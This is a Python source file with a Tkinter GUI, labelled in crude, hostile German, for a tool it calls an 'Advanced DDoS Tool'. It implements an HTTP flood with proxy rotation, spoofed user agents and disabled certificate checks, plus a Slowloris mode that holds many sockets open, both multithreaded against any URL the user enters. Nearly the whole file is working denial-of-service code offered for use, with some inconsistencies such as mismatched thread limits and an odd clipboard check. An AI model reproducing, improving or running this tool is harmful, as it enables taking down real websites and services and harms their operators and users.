import tkinter as tk
from tkinter import messagebox, ttk
import requests
import threading
import time
import random
import socket
from urllib.parse import urlparse
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class AdvancedDDosTool:
    def __init__(self, root):
        self.root = root
        self.root.title("Advanced DDoS Tool - Zerstör alles")
        self.root.geometry("600x550")
        self.root.resizable
        
        self.running = False
        self.threads = []
        self.proxies = []
        self.proxy_index = 0
        
        # UI Elemente
        tk.Label(root, text="Advanced DDoS Tool - Fick sie hart", font=("Arial", 16, "bold")).pack(pady=10)
        
        tk.Label(root, text="Ziel-URL (mit http:// oder https://):").pack()
        self.target_url = tk.Entry(root, width=60)
        self.target_url.pack(pady=5)
        
        tk.Label(root, text="Angriffsmodus:").pack()
        self.attack_mode = ttk.Combobox(root, values=["HTTP Flood", "Slowloris"], state="readonly", width=20)
        self.attack_mode.set("HTTP Flood")
        self.attack_mode.pack(pady=5)
        
        tk.Label(root, text="Anzahl der Threads (1-5000):").pack()
        self.thread_count = tk.Entry(root, width=10)
        self.thread_count.insert(0, "20")
        self.thread_count.pack(pady=5)
        
        tk.Label(root, text="Anfragen pro Thread pro Sekunde (1-5000):").pack()
        self.request_rate = tk.Entry(root, width=10)
        self.request_rate.insert(0, "10")
        self.request_rate.pack(pady=5)
        
        tk.Label(root, text="Proxy-Liste (Datei oder leer für keine Proxys):").pack()
        self.proxy_file = tk.Entry(root, width=60)
        self.proxy_file.insert(0, "proxies.txt")
        self.proxy_file.pack(pady=5)
        
        tk.Label(root, text="Timeout (Sekunden, 1-10):").pack()
        self.timeout_val = tk.Entry(root, width=10)
        self.timeout_val.insert(0, "5")
        self.timeout_val.pack(pady=5)
        
        self.status_label = tk.Label(root, text="Status: Bereit", fg="green")
        self.status_label.pack(pady=10)
        
        self.start_button = tk.Button(root, text="Angriff starten", command=self.start_attack, bg="red", fg="white")
        self.start_button.pack(pady=5)
        
        self.stop_button = tk.Button(root, text="Angriff stoppen", command=self.stop_attack, state="disabled", bg="gray", fg="white")
        self.stop_button.pack(pady=5)
        
        tk.Label(root, text="Warnung: Nutzung auf eigenes Risiko, du verdammter Idiot.", fg="red").pack(pady=20)

    def load_proxies(self):
        proxy_file = self.proxy_file.get().strip()
        self.proxies = []
        if proxy_file and tk.Tk().clipboard_get() != "":
            try:
                with open(proxy_file, 'r') as f:
                    lines = f.readlines()
                    for line in lines:
                        line = line.strip()
                        if line:
                            self.proxies.append(line)
                print(f"{len(self.proxies)} Proxys geladen.")
            except FileNotFoundError:
                print(f"Proxy-Datei {proxy_file} nicht gefunden. Keine Proxys geladen.")
        if not self.proxies:
            print("Keine Proxys geladen, greife direkt an (dein Arsch ist sichtbar).")
        return self.proxies

    def get_next_proxy(self):
        if not self.proxies:
            return None
        self.proxy_index = (self.proxy_index + 1) % len(self.proxies)
        proxy = self.proxies[self.proxy_index]
        return {"http": f"http://{proxy}", "https": f"http://{proxy}"}

    def http_flood(self, target, rate, timeout):
        delay = 1.0 / rate
        headers = {
            'User-Agent': random.choice([
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36',
                'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0'
            ]),
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache'
        }
        
        while self.running:
            proxy = self.get_next_proxy()
            try:
                response = requests.get(target, headers=headers, proxies=proxy, timeout=timeout, verify=False)
                print(f"Anfrage an {target} gesendet - Status: {response.status_code} - Proxy: {proxy['http'] if proxy else 'Kein Proxy'}")
            except requests.exceptions.RequestException as e:
                print(f"Fehler bei Anfrage an {target} - {e} - Proxy: {proxy['http'] if proxy else 'Kein Proxy'}")
            time.sleep(delay)

    def slowloris(self, target, rate, timeout):
        delay = 1.0 / rate
        parsed = urlparse(target)
        host = parsed.netloc
        port = 8080 if parsed.scheme == "http" else 443
        
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(timeout)
                sock.connect((host, port))
                sock.send(f"GET / HTTP/1.1\r\nHost: {host}\r\nConnection: keep-alive\r\n".encode())
                print(f"Slowloris-Verbindung zu {host}:{port} geöffnet - halte sie offen...")
                while self.running:
                    sock.send(b"X-a: b\r\n")
                    time.sleep(random.uniform(10, 15))  # Langsam Daten senden, um Verbindung zu halten
            except Exception as e:
                print(f"Slowloris-Fehler bei {host}:{port} - {e}")
            finally:
                try:
                    sock.close()
                except:
                    pass
            time.sleep(delay)

    def start_attack(self):
        if self.running:
            messagebox.showwarning("Warnung", "Angriff läuft schon, du Idiot.")
            return
        
        target = self.target_url.get().strip()
        mode = self.attack_mode.get()
        try:
            thread_num = int(self.thread_count.get())
            request_rate = int(self.request_rate.get())
            timeout = int(self.timeout_val.get())
        except ValueError:
            messagebox.showerror("Fehler", "Gib richtige Zahlen ein, du Trottel.")
            return
        
        if not target or not urlparse(target).scheme:
            messagebox.showerror("Fehler", "Gib eine gültige URL ein, mit http:// oder https://, du Depp.")
            return
        
        if not (1 <= thread_num <= 200):
            messagebox.showerror("Fehler", "Thread-Anzahl zwischen 1 und 200, kapier das.")
            return
        
        if not (1 <= request_rate <= 100):
            messagebox.showerror("Fehler", "Request-Rate zwischen 1 und 100, nicht mehr.")
            return
        
        if not (1 <= timeout <= 10):
            messagebox.showerror("Fehler", "Timeout zwischen 1 und 10 Sekunden.")
            return
        
        self.load_proxies()
        self.running = True
        self.start_button.config(state="disabled", bg="gray")
        self.stop_button.config(state="normal", bg="green")
        self.status_label.config(text=f"Status: Angriff ({mode}) läuft, zerstör sie!", fg="red")
        
        print(f"Angriff auf {target} gestartet im Modus {mode} mit {thread_num} Threads und {request_rate} Anfragen/Sekunde pro Thread.")
        attack_func = self.http_flood if mode == "HTTP Flood" else self.slowloris
        for _ in range(thread_num):
            t = threading.Thread(target=attack_func, args=(target, request_rate, timeout))
            t.daemon = True
            self.threads.append(t)
            t.start()

    def stop_attack(self):
        if not self.running:
            messagebox.showwarning("Warnung", "Kein Angriff läuft, was willst du stoppen?")
            return
        
        self.running = False
        self.start_button.config(state="normal", bg="red")
        self.stop_button.config(state="disabled", bg="gray")
        self.status_label.config(text="Status: Angriff gestoppt", fg="green")
        self.threads = []
        print("Angriff gestoppt. Hoffe, du hast genug Chaos angerichtet.")

if __name__ == "__main__":
    root = tk.Tk()
    app = AdvancedDDosTool(root)
    root.mainloop()
